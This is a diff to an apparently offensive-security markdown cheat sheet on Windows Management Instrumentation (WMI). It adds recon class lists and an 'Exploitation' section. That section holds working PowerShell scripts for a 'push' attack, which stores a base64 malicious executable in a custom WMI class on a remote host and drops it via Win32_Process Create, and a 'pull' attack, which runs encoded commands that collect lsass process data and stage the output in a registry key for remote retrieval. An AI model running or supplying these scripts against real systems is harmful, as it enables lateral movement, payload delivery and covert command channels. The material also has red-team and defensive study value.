@@ -3,12 +3,16 @@
 - [WMI 4 Attackers](#wmi-4-attackers)
   - [WMI 101](#wmi-101)
   - [WMI Components](#wmi-components)
+    - [WMI utilities](#wmi-utilities)
     - [Manaed Object Format (MOF) files](#manaed-object-format-mof-files)
     - [Providers](#providers)
     - [Managed Objects](#managed-objects)
     - [Namespaces](#namespaces)
     - [Repository](#repository)
     - [Consumers](#consumers)
+    - [Remote WMI Protocols](#remote-wmi-protocols)
+      - [DCOM](#dcom)
+      - [WinRM / PowerShell Remoting](#winrm--powershell-remoting)
   - [WMI with PowerShell](#wmi-with-powershell)
   - [WMI host recon](#wmi-host-recon)
   - [WMI Active Directory Recon](#wmi-active-directory-recon)
@@ -18,6 +22,11 @@
   - [Remote WMI](#remote-wmi)
   - [Registry key manipulation](#registry-key-manipulation)
   - [Recon and information gathering](#recon-and-information-gathering)
+  - [Exploitation](#exploitation)
+      - [WMI Attacks – C2 Communication (WMI Class) – “Push” Attack](#wmi-attacks--c2-communication-wmi-class--push-attack)
+      - [WMI Attacks – C2 Communication (Registry) – “Pull” Attack](#wmi-attacks--c2-communication-registry--pull-attack)
+  - [Persistence using WMI](#persistence-using-wmi)
+      - [MOF files](#mof-files)
   - [Resources](#resources)
       - [BlackHat US 2015: Abusing WMI to built a persistent, asyncronous, and fileless backdoor.](#blackhat-us-2015-abusing-wmi-to-built-a-persistent-asyncronous-and-fileless-backdoor)
       - [WMI for Script Kiddies](#wmi-for-script-kiddies)
@@ -44,6 +53,19 @@
 
 ## WMI Components
 https://0xinfection.github.io/posts/wmi-classes-methods-part-2/
+
+### WMI utilities
+- wmic.exe
+- winrm.exe
+- wbemtest.exe
+- VBScript
+- JScript
+- IWbem COM API
+- .NET System.Management classes
+
+**Linux**
+- wmis-pth
+- wmic
 
 ### Manaed Object Format (MOF) files
 Use to define WMI namespaces, classes, provides etc...  
@@ -82,6 +104,21 @@ Applications or scripts which can be used to interact with WMI classes for query
 - WMIC.exe
 - ... 
 
+### Remote WMI Protocols
+#### DCOM
+- Port 135
+- Not firewall friendly
+- By default WMI service **Winmgmt** is running and listening on port 135.
+
+Enumerate processes on remote system
+```
+Get-WmiObject -Class Win32_Process -ComputerName 192.168.2.10 -Credential 'corp.local\admin'
+```
+
+#### WinRM / PowerShell Remoting
+- SOAP protocl based on the WSMan specification
+- 5985 (HTTP) or 5986 (HTTPS)
+
 ## WMI with PowerShell
 
 Listing WMI providers within PowerShell Version 2 cmdlet:
@@ -100,7 +137,7 @@ PowerShell version 3 provides CIM (Common Information Model) cmdlets which uses 
 ```
 Get-Command -CommandType cmdlet *cim*
 
-Cmdlet          Get-CimAssociatedInstance                          1.0.0.0    CimCmdlets
+Cmdlet          Get-CimAssociatedInstance                           1.0.0.0    CimCmdlets
 Cmdlet          Get-CimClass                                       1.0.0.0    CimCmdlets
 Cmdlet          Get-CimInstance                                    1.0.0.0    CimCmdlets
 Cmdlet          Get-CimSession                                     1.0.0.0    CimCmdlets
@@ -140,6 +177,18 @@ function Get-WmiNamespace {
 ```
 
 ## WMI host recon 
+
+- Host/OS information: ```ROOT\CIMV2:Win32_OperatingSystem, Win32_ComputerSystem```
+- File/directory listing: ```ROOT\CIMV2:CIM_DataFile```
+- Disk volume listing: ```ROOT\CIMV2:Win32_Volume```
+- Registry operations: ```ROOT\DEFAULT:StdRegProv```
+- Running processes: ```ROOT\CIMV2:Win32_Process```
+- Service listing: ```ROOT\CIMV2:Win32_Service```
+- Event log: ```ROOT\CIMV2:Win32_NtLogEvent```
+- Logged on accounts: ```ROOT\CIMV2:Win32_LoggedOnUser```
+- Mounted shares: ```ROOT\CIMV2:Win32_Share```
+- Installed patches: ```ROOT\CIMV2:Win32_QuickFixEngineering```
+- Installed AV: ```ROOT\SecurityCenter[2]:AntiVirusProduct```
 
 List class containing "*bios*" string (by default it will request on root\cimv2 Namespace)
 ```
@@ -449,10 +498,95 @@ Usefull scripts:
 
 ## Recon and information gathering
 
+## Exploitation
+
+#### WMI Attacks – C2 Communication (WMI Class) – “Push” Attack
+**First Step** - Push file contents to remote WMI repository
+```
+# Prep file to drop on remote system
+$LocalFilePath = 'C:\Users\lutz\Documents\maliciousfile.exe'
+$FileBytes = [IO.File]::ReadAllBytes($LocalFilePath)
+$EncodedFileContentsToDrop = [Convert]::ToBase64String($FileBytes)
+# Establish remote WMI connection
+$Options = New-Object Management.ConnectionOptions
+$Options.Username = 'Administrator'
+$Options.Password = 'user'
+$Options.EnablePrivileges = $True
+$Connection = New-Object Management.ManagementScope
+$Connection.Path = '\\192.168.2.10\root\default'
+$Connection.Options = $Options
+$Connection.Connect()
+# "Push" file contents
+$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
+$EvilClass['__CLASS'] = 'Win32_EvilClass'
+$EvilClass.Properties.Add('EvilProperty', [Management.CimType]::String, $False)
+$EvilClass.Properties['EvilProperty'].Value = $EncodedFileContentsToDrop
+$EvilClass.Put()
+```
+
+**Second Step** - Drop file contents to remote system
+```
+$Credential = Get-Credential 'CORP.local\admin'
+$CommonArgs = @{
+Credential = $Credential
+ComputerName = '192.168.2.10'
+}
+$PayloadText = @'
+$EncodedFile = ([WmiClass] 'root\default:Win32_EvilClass').Properties['EvilProperty'].Value
+[IO.File]::WriteAllBytes('C:\reconstructedMaliciousFile.exe', [Convert]::FromBase64String($EncodedFile))
+'@
+$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
+$PowerShellPayload = "powershell -NoProfile -EncodedCommand $EncodedPayload"
+# Drop it like it's hot
+Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload
+# Confirm successful file drop
+Get-WmiObject @CommonArgs -Class CIM_DataFile -Filter 'Name = "C:\\reconstructedMaliciousFile.exe"'
+```
+
+#### WMI Attacks – C2 Communication (Registry) – “Pull” Attack
+**First Step** - Registry Key creation
+```
+$Credential = Get-Credential 'CORP.local\admin'
+$CommonArgs = @{
+Credential = $Credential
+ComputerName = '192.168.2.10'
+}
+$HKLM = 2147483650
+Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name CreateKey -ArgumentList $HKLM,
+'SOFTWARE\EvilKey‘
+Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name DeleteValue -ArgumentList $HKLM,
+'SOFTWARE\EvilKey', 'Result'
+```
+
+**Second Step** - Retrieving payload in registry
+```
+$PayloadText = @'
+$Payload = {Get-Process lsass}
+$Result = & $Payload
+$Output = [Management.Automation.PSSerializer]::Serialize($Result, 5)
+$Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Output))
+Set-ItemProperty -Path HKLM:\SOFTWARE\EvilKey -Name Result -Value $Encoded
+'@
+$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
+$PowerShellPayload = "powershell -NoProfile -EncodedCommand $EncodedPayload"
+Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload
+$RemoteOutput = Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name GetStringValue -
+ArgumentList $HKLM, 'SOFTWARE\EvilKey', 'Result'
+$EncodedOutput = $RemoteOutput.sValue
+$DeserializedOutput =
+[Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Ascii.GetString([Convert]::F
+romBase64String($EncodedOutput)))
+```
+
+
+## Persistence using WMI
+#### MOF files
+
 
 ## Resources
 #### BlackHat US 2015: Abusing WMI to built a persistent, asyncronous, and fileless backdoor.  
 - https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
+- https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEF%20CON%2023%20-%20Ballenthin-Graeber-Teodorescu-WMI-Attacks-Defense-Forensics.pdf
 
 #### WMI for Script Kiddies  
 - https://www.trustedsec.com/blog/wmi-for-script-kiddies/
